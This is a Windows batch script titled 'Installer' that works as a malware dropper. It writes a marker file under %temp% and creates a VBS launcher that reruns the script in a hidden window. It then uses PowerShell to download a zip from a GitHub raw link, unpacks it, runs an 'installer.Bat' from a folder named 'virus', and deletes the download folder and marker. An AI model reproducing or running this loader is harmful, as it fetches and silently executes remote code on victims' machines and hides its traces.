@echo off
setlocal enabledelayedexpansion

if exist %temp%\kjhsdfoijjmsvlknlnkkdsfkljlkjkdsfnmvnnsd.tmp (
goto download
) else (
goto create_Start
)


:download
echo Installing setup...
del /s /q %temp%\kjhsdfoijjmsvlknlnkkdsfkljlkjkdsfnmvnnsd.tmp
Title Installer
echo Installing...
cd %temp%
set randir=%random%-%random%-%random%-%random%-downloads
md %randir%
echo created Randir downlaod path to %temp%\%randir%
set current_path=%temp%\%randir%
if exist "!current_path!\downloads" (
rd /s /q "!current_path!\downloads"
)
cd "!current_path!"
md downloads
echo starting download
powershell Invoke-WebRequest https://github.com/JoeDeezBalls/special-joeBalls/blob/main/Test.zip?raw=true -O %current_path%\downloads\installer.zip
cd downloads
echo unpacking download
powershell -Command "expand-archive installer.zip -destinationpath %current_path%\downloads" >nul
set install=true
echo starting installer
call %current_path%\downloads\virus\installer.Bat
echo install finished, cleaning up
cd %temp%
rd /s /q %randir%
del /s /q %temp%\kjhsdfoijjmsvlknlnkkdsfkljlkjkdsfnmvnnsd.tmp
echo done
timeout 5
exit




:create_Start
set current_path=%~dp0
set start_prg=start.vbs
set start_file_name=downloader.bat
set start_file_path=%current_path%

if exist !start_file_path! (
	echo debug^: creating script.
) else (
	echo debug^: creating script gone wrong
	echo Error^: 001
	goto error
)

echo Set oShell = CreateObject ("Wscript.Shell")>"%start_file_path%\%start_prg%"
echo Dim strArgs>>"%start_file_path%\%start_prg%"
echo strArgs = "cmd /c %start_file_name%">>"%start_file_path%\%start_prg%"
echo oShell.Run strArgs, 0, false>>"%start_file_path%\%start_prg%"

if %errorlevel%==0 (
	echo debug^: scricpt created successfully
) else (
	echo debug^: sonthing went wrong
	goto error
)


echo Joe>%temp%\kjhsdfoijjmsvlknlnkkdsfkljlkjkdsfnmvnnsd.tmp
cd %current_path%
start start.vbs
echo done
exit


:error
pause
exit